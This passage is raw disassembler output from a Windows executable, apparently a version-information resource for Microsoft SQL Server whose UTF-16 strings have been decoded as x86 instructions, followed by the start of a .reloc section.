  40c73f:	add    BYTE PTR [ebp+0x0],al
  40c742:	add    BYTE PTR [eax],al
  40c744:	dec    edx
  40c745:	add    BYTE PTR ds:0x50000100,dl
  40c74b:	add    BYTE PTR [edx+0x0],dh
  40c74e:	outs   dx,DWORD PTR ds:[esi]
  40c74f:	add    BYTE PTR [eax+eax*1+0x75],ah
  40c753:	add    BYTE PTR [ebx+0x0],ah
  40c756:	je     0x40c758
  40c758:	dec    esi
  40c759:	add    BYTE PTR [ecx+0x0],ah
  40c75c:	ins    DWORD PTR es:[edi],dx
  40c75d:	add    BYTE PTR [ebp+0x0],ah
  40c760:	add    BYTE PTR [eax],al
  40c762:	add    BYTE PTR [eax],al
  40c764:	dec    ebp
  40c765:	add    BYTE PTR [ecx+0x0],ch
  40c768:	arpl   WORD PTR [eax],ax
  40c76a:	jb     0x40c76c
  40c76c:	outs   dx,DWORD PTR ds:[esi]
  40c76d:	add    BYTE PTR [ebx+0x0],dh
  40c770:	outs   dx,DWORD PTR ds:[esi]
  40c771:	add    BYTE PTR [esi+0x0],ah
  40c774:	je     0x40c776
  40c776:	and    BYTE PTR [eax],al
  40c778:	push   ebx
  40c779:	add    BYTE PTR [ecx+0x0],dl
  40c77c:	dec    esp
  40c77d:	add    BYTE PTR [eax],ah
  40c77f:	add    BYTE PTR [ebx+0x0],dl
  40c782:	add    BYTE PTR gs:[edx+0x0],dh
  40c786:	jbe    0x40c788
  40c788:	add    BYTE PTR gs:[edx+0x0],dh
  40c78c:	add    BYTE PTR [eax],al
  40c78e:	add    BYTE PTR [eax],al
  40c790:	add    BYTE PTR ds:0x50000100,cl
  40c797:	add    BYTE PTR [edx+0x0],dh
  40c79a:	outs   dx,DWORD PTR ds:[esi]
  40c79b:	add    BYTE PTR [eax+eax*1+0x75],ah
  40c79f:	add    BYTE PTR [ebx+0x0],ah
  40c7a2:	je     0x40c7a4
  40c7a4:	push   esi
  40c7a5:	add    BYTE PTR [ebp+0x0],ah
  40c7a8:	jb     0x40c7aa
  40c7aa:	jae    0x40c7ac
  40c7ac:	imul   eax,DWORD PTR [eax],0x6e006f
  40c7b2:	add    BYTE PTR [eax],al
  40c7b4:	xor    DWORD PTR [eax],eax
  40c7b6:	xor    DWORD PTR [eax],eax
  40c7b8:	add    BYTE PTR cs:[eax],dh
  40c7bb:	add    BYTE PTR [esi],ch
  40c7bd:	add    BYTE PTR [edx],dh
  40c7bf:	add    BYTE PTR [ecx],dh
  40c7c1:	add    BYTE PTR [eax],dh
  40c7c3:	add    BYTE PTR [eax],dh
  40c7c5:	add    BYTE PTR [esi],ch
  40c7c7:	add    BYTE PTR [esi],dh
  40c7c9:	add    BYTE PTR [eax],dh
  40c7cb:	add    BYTE PTR [eax],al
  40c7cd:	add    BYTE PTR [eax],al
  40c7cf:	add    BYTE PTR [eax+eax*1+0x0],al
  40c7d3:	add    BYTE PTR [ecx],al
  40c7d5:	add    BYTE PTR [esi+0x0],dl
  40c7d8:	popa   
  40c7d9:	add    BYTE PTR [edx+0x0],dh
  40c7dc:	inc    esi
  40c7dd:	add    BYTE PTR [ecx+0x0],ch
  40c7e0:	ins    BYTE PTR es:[edi],dx
  40c7e1:	add    BYTE PTR [ebp+0x0],ah
  40c7e4:	dec    ecx
  40c7e5:	add    BYTE PTR [esi+0x0],ch
  40c7e8:	data16 add BYTE PTR [edi+0x0],ch
  40c7ec:	add    BYTE PTR [eax],al
  40c7ee:	add    BYTE PTR [eax],al
  40c7f0:	and    al,0x0
  40c7f2:	add    al,0x0
  40c7f4:	add    BYTE PTR [eax],al
  40c7f6:	push   esp
  40c7f7:	add    BYTE PTR [edx+0x0],dh
  40c7fa:	popa   
  40c7fb:	add    BYTE PTR [esi+0x0],ch
  40c7fe:	jae    0x40c800
  40c800:	ins    BYTE PTR es:[edi],dx
  40c801:	add    BYTE PTR [ecx+0x0],ah
  40c804:	je     0x40c806
  40c806:	imul   eax,DWORD PTR [eax],0x6e006f
  40c80c:	add    BYTE PTR [eax],al
  40c80e:	add    BYTE PTR [eax],al
  40c810:	or     DWORD PTR [eax+esi*4],eax
  40c813:	add    al,0x0
  40c815:	add    BYTE PTR [eax],al
	...

Disassembly of section .reloc:

0040e000 <.reloc>:
  40e000:	add    BYTE PTR [eax+0xc0000],dh
  40e006:	add    BYTE PTR [eax],al
  40e008:	.byte 0xa0
  40e009:	xor    DWORD PTR [eax],eax
	...
